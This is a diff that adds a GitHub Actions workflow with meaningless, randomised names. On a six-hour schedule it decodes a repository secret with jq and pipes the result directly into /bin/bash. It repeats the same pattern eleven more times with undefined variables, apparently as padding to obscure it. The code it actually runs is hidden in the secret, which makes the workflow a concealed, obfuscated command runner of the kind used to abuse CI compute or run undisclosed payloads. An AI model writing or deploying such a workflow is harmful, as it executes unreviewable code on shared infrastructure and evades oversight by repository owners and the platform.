@@ -1,0 +1,28 @@
+name: mengtancheng9845
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mengtancheng9845
+        env:
+          tehh81: ${{ secrets.tehh81 }}
+        run: |
+          echo $tehh81 | jq -r .betu87 | /bin/bash
+          echo $nkehg03486 | jq -r .k98 | /bin/bash
+          echo $wtmk9 | jq -r .c87735 | /bin/bash
+          echo $i69 | jq -r .widp6 | /bin/bash
+          echo $n80039 | jq -r .md48767 | /bin/bash
+          echo $pc9845 | jq -r .vlyb4004 | /bin/bash
+          echo $s6 | jq -r .ba2 | /bin/bash
+          echo $o91251 | jq -r .yvnfj72680 | /bin/bash
+          echo $bu7142 | jq -r .o58 | /bin/bash
+          echo $z148 | jq -r .u45 | /bin/bash
+          echo $q7 | jq -r .udy3 | /bin/bash
+          echo $feicy47 | jq -r .aq1 | /bin/bash
+
